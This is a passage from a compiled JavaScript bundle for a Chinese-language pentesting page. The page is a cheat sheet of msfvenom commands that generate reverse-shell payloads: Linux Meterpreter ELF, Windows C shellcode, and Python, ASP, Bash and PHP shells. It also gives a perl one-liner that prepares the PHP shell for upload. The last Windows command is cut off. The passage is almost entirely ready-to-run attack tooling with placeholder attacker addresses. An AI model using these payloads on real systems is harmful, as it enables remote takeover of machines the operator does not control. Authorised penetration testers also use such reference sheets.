"),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("h3",{attrs:{id:"msf-生成在-linux-下反弹的-meterpreter-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-生成在-linux-下反弹的-meterpreter-shell"}},[s._v("#")]),s._v(" MSF 生成在 Linux 下反弹的 Meterpreter Shell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p linux/x86/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" -e -f elf -a x86 --platform linux -o shell\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"msf-生成反弹-shell-c-shellcode"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-生成反弹-shell-c-shellcode"}},[s._v("#")]),s._v(" MSF 生成反弹 Shell (C Shellcode)")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p windows/shell_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" -b "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x00"}},[s._v("\\x00")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x0a"}},[s._v("\\x0a")]),t("span",{pre:!0,attrs:{class:"token entity",title:"\\x0d"}},[s._v("\\x0d")]),s._v('"')]),s._v(" -a x86 --platform win -f c\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"msf-生成反弹-python-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-生成反弹-python-shell"}},[s._v("#")]),s._v(" MSF 生成反弹 Python Shell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p cmd/unix/reverse_python "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("443")]),s._v(" -o shell.py\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"msf-生成反弹-asp-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-生成反弹-asp-shell"}},[s._v("#")]),s._v(" MSF 生成反弹 ASP Shell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your Port to Connect On"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" -f asp -a x86 --platform win -o shell.asp\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"msf-生成反弹-bash-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-生成反弹-bash-shell"}},[s._v("#")]),s._v(" MSF 生成反弹 Bash Shell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p cmd/unix/reverse_bash "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your Port to Connect On"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" -o shell.sh\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"msf-生成反弹-php-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-生成反弹-php-shell"}},[s._v("#")]),s._v(" MSF 生成反弹 PHP Shell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p php/meterpreter_reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your Port to Connect On"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" -o shell.php\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("?php at the beginning\nperl -i~ -0777pe"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'s/^/<?php "),t("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("/'")]),s._v(" shell.php\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h3",{attrs:{id:"msf-生成反弹-win-shell"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf-生成反弹-win-shell"}},[s._v("#")]),s._v(" MSF 生成反弹 Win Shell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p windows/meterpreter/reverse_tcp "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your IP Address"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Your Port to Co\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])])])}),[],!1,null,null,null);a.default=r.exports}}]);